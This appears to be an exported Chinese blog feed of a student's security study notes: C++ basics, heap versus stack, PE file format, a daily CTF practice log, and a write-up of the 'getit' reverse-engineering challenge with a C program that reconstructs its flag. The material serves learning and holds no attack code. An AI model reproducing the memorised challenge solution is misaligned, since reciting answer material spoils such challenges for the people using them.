虚拟机技术以效率换取安全，一条指令经过虚拟机处理，体积会膨胀几十几百倍。因此，VM保护通常经过sdk方式，只把较为重要的代码保护起来</p>
<h1>c++</h1>
<h2 id="输入和输出">输入和输出</h2>
<p>可以用scanf和printf，也可用c++中增加的输入输出库<br>
如果要使用输入输出时，需要包含头文件：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>使用cin和count进行输入和输出</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    cin&gt;&gt;x;<span class="comment">//多输出：cin&gt;&gt;x&gt;&gt;y;</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;The int number is x= &quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//endl即end of line 表示结尾进行换行</span></span><br></pre></td></tr></table></figure>
<p>cin和count这两个运算符可以自行分析处理（强制转换）数据类型，因此无需像使用scanf和printf那样给出格式控制字符串。</p>
<h2 id="new和delete">new和delete</h2>
<p>用来动态分配内存和释放内存</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>;  <span class="comment">//分配1个int型的内存空间</span></span><br><span class="line"><span class="keyword">delete</span> p;  <span class="comment">//释放内存</span></span><br><span class="line"><span class="comment">//以及</span></span><br><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];  <span class="comment">//分配10个int型的内存空间</span></span><br><span class="line"><span class="keyword">delete</span>[] p;</span><br></pre></td></tr></table></figure>
<h2 id="类和对象">类和对象</h2>
<p>类只是一种数据类型，本身并不占用空间</p>
<h3 id="定义">定义</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span><span class="comment">//关键字class专门用来定义类，Student是类的名称，类名首字母一般大写</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//表示类的成员具有公开的访问权限，其他还有private等</span></span><br><span class="line">    <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="comment">//成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;name&lt;&lt;<span class="string">&quot;的年龄是&quot;</span>&lt;&lt;age&lt;&lt;<span class="string">&quot;，成绩是&quot;</span>&lt;&lt;score&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="title">LLL</span>;</span><span class="comment">//创建对象 ，class可不要，LLL也可为数组</span></span><br><span class="line"><span class="comment">// 用.访问成员</span></span><br><span class="line"><span class="comment">//与结构体贼相似</span></span><br></pre></td></tr></table></figure>
<h3 id="对象指针">对象指针</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在栈上分配内存</span></span><br><span class="line">Student stu;</span><br><span class="line">Student *pStu = &amp;stu;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在堆上分配内存</span></span><br><span class="line">Student *pStu = <span class="keyword">new</span> Student;</span><br><span class="line"><span class="comment">//访问时通过&quot;-&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="成员变量和成员函数">成员变量和成员函数</h3>
<p>在类中直接定义函数时，不需要在函数名前加类名；当成员函数定义在类外时，要在函数名前加类名</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::say</span><span class="params">()</span></span>&#123;<span class="comment">// 如果写成inline void Student::say 就为内联函数</span></span><br><span class="line">    <span class="comment">//::是域解析符（作用域运算符、作用域限定符）用来连接类名和函数名</span></span><br><span class="line">    cout&lt;&lt;name&lt;&lt;<span class="string">&quot;的年龄是&quot;</span>&lt;&lt;age&lt;&lt;<span class="string">&quot;，成绩是&quot;</span>&lt;&lt;score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>在类体中定义的成员函数会自动成为内联函数，在类体外定义的不会</strong><br>
内联函数会将函数调用处用函数体代替，所以尽量在类内部作声明，在类外对函数定义</p>
<blockquote>
<p>函数调用是有时间和空间开销的。程序在执行一个函数之前需要将实参、局部变量、返回地址以及若干寄存器都压入栈中，然后才能执行函数体中的代码；执行完之后，还要将之前压入栈中的数据都出栈，才能接着执行函数调用位置以后的代码。<br>
如果函数体代码比较多，需要较长的执行时间，那么函数调用机制占用的时间可以忽略；如果函数只有一两句语句，那么大部分的时间都会花费在函数调用机制上，这种时间开销就不容忽视。<br>
为了消除函数调用的时空开销，C++在编译时将函数调用处用函数体替换，即内联函数。<br>
内联函数的缺点：编译后的程序会存在多份相同的函数拷贝。<br>
内联函数的代码在编译后就被消除了</p>
</blockquote>
<h3 id="类成员的访问权限和类的封装">类成员的访问权限和类的封装</h3>
<p>控制成员的访问权限：成员访问限定符public、protected、private<br>
在类的内部，成员可以互相访问；在类的外部，只能通过对象访问public属性的成员<br>
约定成员变量以*m_*开头，可以直接看出是成员变量，又可以和成员函数中的形参名字区分</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:  <span class="comment">//私有的</span></span><br><span class="line">    <span class="keyword">char</span> *m_name;</span><br><span class="line">    <span class="keyword">float</span> m_score;</span><br><span class="line"><span class="keyword">public</span>:  <span class="comment">//共有的</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setname</span><span class="params">(<span class="keyword">char</span> *name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setscore</span><span class="params">(<span class="keyword">float</span> score)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::setname</span><span class="params">(<span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    m_name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::setscore</span><span class="params">(<span class="keyword">float</span> score)</span></span>&#123;</span><br><span class="line">    m_score = score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//在栈上创建对象</span></span><br><span class="line">    Student stu;</span><br><span class="line">    stu.<span class="built_in">setname</span>(<span class="string">&quot;小明&quot;</span>);</span><br><span class="line">    stu.<span class="built_in">setscore</span>(<span class="number">92.5f</span>);</span><br><span class="line">    <span class="comment">//在堆上创建对象</span></span><br><span class="line">    Student *pstu = <span class="keyword">new</span> Student;</span><br><span class="line">    pstu -&gt; <span class="built_in">setname</span>(<span class="string">&quot;李华&quot;</span>);</span><br><span class="line">    pstu -&gt; <span class="built_in">setscore</span>(<span class="number">96</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面的写法是错误的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stu.m_name = <span class="string">&quot;小明&quot;</span>;</span><br><span class="line">stu.m_score = <span class="number">92.5f</span>;</span><br><span class="line">stu.<span class="built_in">show</span>();</span><br></pre></td></tr></table></figure>
<p>因为私有的成员变量不能通过对象直接访问，必须借助public属性的成员函数来修改</p>
<h4 id="类的封装">类的封装</h4>
<p>private：作用在于更好的隐藏内部的实现，不希望外部知道或只在内部使用的成员声明为private<br>
public：向外部暴露的接口声明为public//如上面的setname()和setscore()<br>
（实际项目开发中，成员变量都建议声明为private，只将允许通过对象对用的成员函数声明为public）<br>
protected：在类外也不能通过对象访问，但在派生类内部可以访问</p>
<blockquote>
<p>给成员变量赋值的函数通常以set开头；读取成员变量的值的函数通常以get开头</p>
</blockquote>
<p>private 和 public的使用体现了类的封装性，即：尽量隐藏类的内部实现，只向用户提供有用的成员函数。</p>
<h3 id="构造函数">构造函数</h3>
<p>一种特殊的成员函数，名称与类名完全相同，可用于对某些成员变量设置初始值。创建对象时系统会自动调用构造函数进行初始化工作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Line::<span class="built_in">Line</span>( <span class="keyword">double</span> len，<span class="keyword">int</span> age, <span class="keyword">float</span> score): <span class="built_in">length</span>(len)<span class="comment">//构造函数，也可以对多个成员变量进行赋值</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//相当于</span></span><br><span class="line">Line::<span class="built_in">Line</span>( <span class="keyword">double</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    length = len;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="初始化const成员变量">初始化const成员变量</h4>
<p>如：对下面m_len的初始化</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VLA</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> m_len;</span><br><span class="line">    <span class="keyword">int</span> *m_arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">VLA</span>(<span class="keyword">int</span> len);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>只能使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">VLA::<span class="built_in">VLA</span>(<span class="keyword">int</span> len):<span class="built_in">m_len</span>(len)&#123;</span><br><span class="line">    m_arr=<span class="keyword">new</span> <span class="keyword">int</span>[len]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//而不能：</span></span><br><span class="line">VLA::<span class="built_in">VLA</span>(<span class="keyword">int</span> len)&#123;</span><br><span class="line">    m_len = len;</span><br><span class="line">    m_arr = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>堆和栈的区别</h1>
<ol>
<li>内存分配<br>
堆由程序员分配和释放；栈由编译器自动分配</li>
<li>申请方式<br>
堆：用malloc、new申请；栈：如int a</li>
<li>大小限制<br>
堆：向高地址扩展，用不连续的内存空间存储。大小受到系统虚拟内存大小的限制，因此获得的空间比较大<br>
栈：向低地址扩展，一块连续的内存空间。栈的大小是固定的，能申请的空间比较小</li>
<li>效率<br>
堆：速度慢，容易产生内存碎片<br>
栈：系统分配，速度快</li>
</ol>
<h1>攻防世界逆向题</h1>
<h2 id="getit">getit</h2>
<p>首先放到ida里看伪代码<br>
<img src="https://s1.ax1x.com/2020/05/24/tSSEUs.png" alt="tSSEUs.png"><br>
其中<br>
t存放的是“SharifCTF{???}”<br>
u存放的是“*******************************************”<br>
s存放的是“c61b68366edeb7bdce3c6820314b7498”<br>
并且s的长度和t里的?一样；“SharifCTF{”长度为10<br>
整段伪代码大概就是：<br>
先改变t里每个?的值，然后输出到文件，然后再改变整个t，再输出一次，最后把这个文件删了<br>
<img src="https://s1.ax1x.com/2020/05/24/tSSAEj.png" alt="tSSAEj.png"><br>
在第一次输出时伪代码是：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(stream, <span class="string">&quot;%s\n&quot;</span>, u, v5);</span><br></pre></td></tr></table></figure>
<p>只有一个%s，看起来只输出了u，并没有输出v5</p>
<p>在第二次输出时用到了fseek(),其作用是将文件的指针移动：<br>
<img src="https://s1.ax1x.com/2020/05/24/tSSwrD.png" alt="tSSwrD.png"></p>
<p>由于u的内容一直都是&quot;<em>…</em>**<em>…</em>&quot;，那么也就是说存放flag的t被最后一个循环覆盖为了一堆 *<br>
综上，flag应该出现在第一次输出时的t里，得到flag的过程为程序的第一个循环，可以得到代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">50</span>]=<span class="string">&quot;c61b68366edeb7bdce3c6820314b7498&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> v=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> v3;</span><br><span class="line">	<span class="keyword">char</span> t[<span class="number">50</span>]=<span class="string">&quot;SharifCTF&#123;????????????????????????????????&#125;&quot;</span>; </span><br><span class="line">	<span class="keyword">while</span>((<span class="keyword">signed</span> <span class="keyword">int</span> )v&lt;<span class="built_in">strlen</span>(s))&#123;</span><br><span class="line">		<span class="keyword">if</span>(v&amp;<span class="number">1</span>)</span><br><span class="line">			v3=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			v3=<span class="number">-1</span>;</span><br><span class="line">		*(t+(<span class="keyword">signed</span> <span class="keyword">int</span>)v+<span class="number">10</span>)=s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v]+v3;</span><br><span class="line">		<span class="comment">//从&#123;后面开始修改数组t的内容 </span></span><br><span class="line">		v=v+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>CTF</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.25-2020.05.24</title>
    <url>/33336.html</url>
    <content><![CDATA[<h1>PE文件格式</h1>
<p>可执行文件的格式是操作系统本身执行机制的反映。<br>
PE（Portable Executable File Format 可移植的执行体)<br>
头文件winnt.h中的image format给出了pe文件的内容，可以找到所有pe文件的数据结构定义、枚举类型、常量定义等<br>
exe和dll文件使用完全相同的pe格式，唯一的区别就是用一个字段标识出这个文件是exe还是dll<br>
64位Windows只是对pe格式进行了一些简单的修饰，新的格式为pe32+，没有新的结构加入，只是把32位字段扩展成64位<br>
<img src="https://s1.ax1x.com/2020/05/25/tCceGn.png" alt="tCceGn.png"></p>
<span id="more"></span>
<h2 id="PE的基本概念">PE的基本概念</h2>
<p>pe文件的内容分为不同区块，区块中包含代码或数据，各个区块按页边界对齐。区块大小没有限制，是一个连续的结构。每个块在内存中都有自己的属性如是否包含代码、是否可读写等<br>
pe文件不是作为单一内存映射文件被载入内存。pe装载器遍历pe文件并决定文件的哪部分被映射。磁盘文件一旦被载入内存，磁盘上的数据结构布局和内存中的数据结构布局就是一致的，但数据之间的的相对位置可能会改变</p>
<h3 id="基地址">基地址</h3>
<p>PE文件通过加载器载入内存后，内存中的版本称为模块。映射文件的起始地址（基地址）称为模块句柄，可以通过模块句柄访问内存中的其他数据结构。<br>
<img src="https://s1.ax1x.com/2020/05/25/tCcm2q.png" alt="tCcm2q.png"><br>
内存中的模块代表进程将这个可执行文件所需要的代码、数据、输入表、输出表及其他有用的数据结构所使用的内存都放在一个连续的内存块中。PE文件的剩余部分可以被读入，但可能无法被映射。例如在将调试信息放到文件尾部时，PE的一个字段会告诉系统不能映射的数据将被放置在文件的尾部。在32位Windows种可以直接调用GetModuleHandle取得指向dll的指针，通过该指针访问DLL Mdodle。<br>
基地址的值是由pe文件本身设定的</p>
<h2 id="虚拟地址（Virtual-Address）">虚拟地址（Virtual Address）</h2>
<h3 id="相对虚拟地址（RVA）">相对虚拟地址（RVA）</h3>
<p>相对于pe文件载入地址的偏移位置，其实就是一个偏移量。<br>
假设一个文件从400000h处载入，代码区块开始于401000h处，代码区块的RVA计算方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标地址401000-载入地址400000h=RVA1000h</span><br></pre></td></tr></table></figure>
<p>同样，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">虚拟地址VA=基地址ImageBase+相对虚拟地址RVA</span><br></pre></td></tr></table></figure>
<h3 id="文件偏移地址（物理地址）">文件偏移地址（物理地址）</h3>
<p>pe文件的某个数据位置相对于文件头的偏移量<br>
用十六进制工具打开文件时显示的地址就是文件偏移地址</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>CTF</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>大一暑假日常</title>
    <url>/31605.html</url>
    <content><![CDATA[<h2 id="8-8">8-8</h2>
<p>上周在做moectf，被新生赛弄自闭了（</p>
<p>加密与解密</p>
<h2 id="8-1">8-1</h2>
<p>7-31没学所以没写…<br>
写了七题moectf，两题re，三题web，一题pwn，一题经典密码<br>
pwn写的感觉自己很瓜，有个叫backdoor的函数名硬是看了半个小时没看到…</p>
<span id="more"></span>
<h2 id="7-29、7-30">7-29、7-30</h2>
<p>7-29：早上看了点数据结构-树，下午坐动车，在车上看了《程》第六章前三节（然后就睡着了…，晚上啥也没干，日报也没写:)<br>
7-30：写了一题pwn，两题re</p>
<p><a href="/2827.html">材料</a></p>
<h2 id="7-28">7-28</h2>
<p>昨天晚上以为把昨天的上传掉了，结果早上彦林哥问起来的时候发现并没有弄上…下午发现因为昨天那篇用了大括号，hexo g的时候报错了（然后没有注意到就hexo d了）<br>
大括号嵌套使用的时候要加上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% raw %&#125;内容&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>
<p>好像其他括号啥的直接嵌套着用也会报错，不过还没有遇到</p>
<ol>
<li>数据结构看了串和树的开头</li>
<li>写了一题pwnable.kr上的题</li>
</ol>
<p>本来想写个攻防世界上的”guess_num“，结果场景加载不出来</p>
<p><a href="/53130.html">材料</a></p>
<h2 id="7-27">7-27</h2>
<p>看了点数据结构，本来想写一题pwn题，结果pwntools突然用不了（可能是之前删了一些文件），安装pwndbg也不知道有没有弄上…就没写了<br>
早上kali网络连不上，虚拟机上弄了半个小时没好，物理机的网络重新连接一下又好了…<br>
打算这几天写掉这两题</p>
<ol>
<li><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1NyZwYWdlPTE=">guess_num<i class="fa fa-external-link-alt"></i></span></li>
<li>passcode:ssh <span class="exturl" data-url="bWFpbHRvOnBhc3Njb2RlQHB3bmFibGUua3I=">passcode@pwnable.kr<i class="fa fa-external-link-alt"></i></span> -p2222 (pw:guest)</li>
</ol>
<p><a href="/52170.html">材料(笔记)</a></p>
<h2 id="7-24">7-24</h2>
<ol>
<li>一题pwn。有思路，但是有个地方不知道怎么实现，看了别人的exp知道怎么写了，不过有些地方还不是很懂</li>
<li>《逆向工程核心原理》第四章</li>
</ol>
<p><a href="/51850.html">材料</a></p>
<h2 id="7-23">7-23</h2>
<ol>
<li>写了一题攻防世界的pwn题:<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1MSZwYWdlPTE=">when_did_you_born<i class="fa fa-external-link-alt"></i></span>，看了一题<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1NyZwYWdlPTE=">guess_num<i class="fa fa-external-link-alt"></i></span>，还没写出来（应该是不会了…）</li>
<li>看了点数据结构的堆栈  部分</li>
</ol>
<p>写题花了比较久，差不多是看了三题发现一题会写，一题思路错了，一题根本没思路…<br>
<a href="/64573.html">材料</a></p>
<h2 id="7-22">7-22</h2>
<p>今天有半天在动车上…</p>
<ol>
<li>攻防世界上写了一题pwn：<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1MyZwYWdlPTE=">level0<i class="fa fa-external-link-alt"></i></span></li>
<li>《程》第四章第一节到第四节</li>
</ol>
<p>打算以后十一点半后不看手机电脑了:(<br>
好像也没啥材料写…</p>
<h2 id="7-21">7-21</h2>
<p>昨天（周一）把《程》第三章看完，感觉没啥好写的（其实是晚上十一点才想起来就懒得写了…）</p>
<ol>
<li>发现上回把pwntools装上了（之前以为没装成），就在pwnable.kr上写了两题，攻防世界写了一题pwn。emmm看的题比写的多一点</li>
<li>看了《逆向工程核心原理》的第二章。分析了“hello world”程序，讲了两种修改输出字符串的方法。没啥想法。</li>
</ol>
<p>感觉最近越来越懒了…一直看电脑导致眼睛也有点不舒服…<br>
不想看PDF，想买书了orz<br>
<a href="/14532.html">今天的材料</a></p>
<h2 id="7-17">7-17</h2>
<ol>
<li>把数据结构数组的部分跳过了，看了一些堆栈的</li>
<li>写了个<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwODEmcGFnZT0x">攻防世界上的re题<i class="fa fa-external-link-alt"></i></span> (以及九道非常入门的web题…)</li>
</ol>
<p><a href="/12344.html">今天的材料</a></p>
<h2 id="7-16">7-16</h2>
<ol>
<li>看了点数组（对称矩阵的压缩存储）。感觉各种存储结构好复杂…明天再查点资料</li>
<li>把昨天那题剩下的部分看完了</li>
</ol>
<p><a href="/13445.html">今天的材料</a></p>
<h2 id="7-15">7-15</h2>
<ol>
<li>《程》第三章第三节</li>
<li>数据结构线性表的两个应用举例。一个是链式存储一元多项式的和，这个之前在mooc上看过，没啥感觉；另一个打印文本文件最后n行，链表的部分懂了，argc、*argv[]和通过命令行输入参数不是很懂…</li>
<li>把彦林学长上回给的一题逆向题再看了一点，就汇编代码对照着伪代码理解了一下</li>
</ol>
<p><a href="/64075.html">这个是有关材料</a></p>
<h2 id="7-14">7-14</h2>
<p>今天跟昨天差不多，早上有点事，下午去驾校，（晚上打lol），学的很少…</p>
<ol>
<li>《程》第三章，（本来以为能把这章看完，但事实上并没有…）就看了前两节。跟《加密与解密》十一章（PE）有点关系，就多了个ELF文件，感觉这个讲的更细一些，也对之前看的加密与解密更理解了（大概吧）</li>
<li>双向循环链表和非循环链表。把指针设为llink和rlink，其它好像不是特别难（…）。这章还剩下应用举例没看，感觉好像有点复杂Orz</li>
</ol>
<h2 id="7-13">7-13</h2>
<p>（今天好像没干啥，早上有点事，下午去驾校挂科二时长的时候才开始看点书）</p>
<ol>
<li>看了点线性链表，感觉基本跟上学期学的没啥差别，就再多了逆转、合并、排序，感觉挺巧妙的但不难</li>
<li>《程序员的自我修养》看完了第二章，上周第一章“回顾大家所了解的”看得瑟瑟发抖。这章了解了一些预处理、编译、汇编和链接的大致过程，还有静态语言、动态语言、静态链接、动态链接的区别。emmm写编译器真是太难了…</li>
</ol>
]]></content>
      <tags>
        <tag>日报</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.07.06-2020.07.12</title>
    <url>/36664.html</url>
    <content><![CDATA[<h2 id="MS-DOS头部">MS-DOS头部</h2>
<p>每一个pe文件都以一个dos程序开始。程序在dos下执行，dos就能识别出这是一个有效的执行体，然后运行MZ header的DOS stub（dos块）。DOS stub是一个有效的exe，大多数情况下由编译器或汇编器自动生成。通常把DOS MZ头和DOS stub合称为DOS文件头。<br>
PE文件的第一个字节位于MS-DOS头部，称作IMAGE_DOS_HEADER，其中有两个字段：e_magic和e_lfanew。</p>
<span id="more"></span>
<ul>
<li>
<p>e_magic的值被设为5A4Dh,ASCII值为MZ</p>
</li>
<li>
<p>e_lfanew指出真正的PE文件头的相对偏移位置，占4字节，在文件开始偏移3Ch字节处。</p>
</li>
</ul>
<h2 id="PE文件头部">PE文件头部</h2>
<p>紧接着DOS stub的是PE文件头。PE文件头是PE相关结构NT映像头的简称，其中包含许多PE装载器能用到的重要字段。当执行体在支持PE文件结构的操作系统中执行是，PE装载器将从IMAGE_DOS_HADER结构的e_lfanew字段中找到PE文件头的起始偏移量，加上基址就得到PE文件头的指针。<br>
IMAGE_DOS_HEADER有两个版本，一个是为32位（PE32）可执行文件准备的,另一个是64位（PE32+）的，两个几乎没有区别。<br>
IMAGE_DOS_HEADER中有3个字段：</p>
<h3 id="Signature字段">Signature字段</h3>
<p>在一个有效的PE文件里，Signature字段被设置为0x00004550，对应ASCII字符为PE00<br>
MS-DOS头部的e_lfanew正是指向这个字段</p>
<h3 id="FileHeader字段">FileHeader字段</h3>
<p>IMAGE_FILE_HEADER（映像头文件）结构包含PE文件的一些基本信息和这个结构的大小。<br>
结构的各个字段包括：</p>
<ol>
<li>
<p>Machine：可执行文件的目标cpu类型</p>
</li>
<li>
<p>NumberOfSection：区块的数目</p>
</li>
<li>
<p>TimeDateStamp：文件创建时间</p>
</li>
<li>
<p>PointerToSymbolTable：COFF符号表的文件偏移位置</p>
</li>
<li>
<p>NumberOfSymbols：如果有COFF符号表，它代表其中的符号数目，可以用来找到COFF符号表的结束处</p>
</li>
<li>
<p>SizeOfOptionalHeader：表示数据的大小，依赖于文件是32位还是64位</p>
</li>
<li>
<p>Characteristics：文件属性，定义域winnt.h内的IMAGE_FILE_xxx值</p>
</li>
</ol>
<h3 id="OptionalHeader字段">OptionalHeader字段</h3>
<p>定义PE文件的其他属性</p>
<h2 id="区块">区块</h2>
<p><img src="https://s1.ax1x.com/2020/07/10/UMsx29.png" alt="UMsx29.png"><br>
<img src="https://s1.ax1x.com/2020/07/10/UMszvR.png" alt="UMszvR.png"></p>
<h3 id="区块表">区块表</h3>
<p>区块表是一个IMAGE_SECTION_HEADER结构数组，每个区块表结构包含了它所关联的区块的信息，例如位置、长度等，数组的数目由IMAGE_NT_HEADERS.FileHeader.NumberOfSection指出。</p>
<h3 id="常见区块与区块合并">常见区块与区块合并</h3>
<p>链接器能够合并区块，优点是节省空间。每个区块至少占用一个内存页，将两个区块合并就有可能少用一个内存页。<br>
部分在载入内存时由Windows加载器写入的输入数据可能会被放入只读区块，因为在加载时，系统会临时修改那些包含输入数据的页属性为可读可写，初始化完成后恢复为原来的属性</p>
<h3 id="区块对齐值">区块对齐值</h3>
<p>区块有两种对齐值，一种用于磁盘文件内，一种用于内存，两者可以不同。<br>
PE文件头里的FileAlignment定义了<em>磁盘区块</em>的对齐值。在不足的地方（区块间隙）用00h填充<br>
PE文件头里的SectionAlignment定义了<em>内存区块</em>的对齐值。当PE文件被映射到内存中时，区块总是至少从一个页边界处开始，即每个区块的第一个字节对应于某个内存页。<br>
建立一个区块在文件中的偏移和内存中的偏移相同的PE文件，可以提高载入速度并使文件变大</p>
<h3 id="文件偏移与虚拟地址的转换">文件偏移与虚拟地址的转换</h3>
<p>对于磁盘对齐值和内存页不同的区块，同一数据在磁盘文件中的偏移和在内存中的偏移不同，需要进行转换。<br>
<img src="https://s1.ax1x.com/2020/07/15/U010qs.png" alt="U010qs.png"><br>
文件被映射到内存中时，MS-DOS头部、PE文件头和块表的偏移位置和大小没有变化，而各区块被映射到内存后偏移位置发生变化</p>
<h2 id="输入表">输入表</h2>
<p>可执行文件使用来自其他DLL的代码或数据的动作称为输入。当PE文件被载入时，加载器的工作之一就是定位所有被输入的函数和数据，并让文件可以使用那些地址。这个过程通过PE文件的输入表Import Table完成。输入表中保存的是函数名和其驻留的DLL名等动态链接所需的信息。</p>
<h3 id="输入函数的调用">输入函数的调用</h3>
<p>输入函数被程序调用，但执行代码不在程序中。这些函数的代码位于相关的DLL文件中，在程序中只保留函数信息如函数名、DLL文件名等。磁盘上的PE文件无法得知这些输入函数在内存中的地址，只有当载入内存后，加载器才将相关DLL载入，并将函数地址和调用的指令联系起来</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>部分pwn题wp</title>
    <url>/26411.html</url>
    <content><![CDATA[<p>主要是大二上刚开学做的题</p>
<span id="more"></span>
<h1>2020moectf部分pwn</h1>
<h2 id="rop1">rop1</h2>
<p>wp:</p>
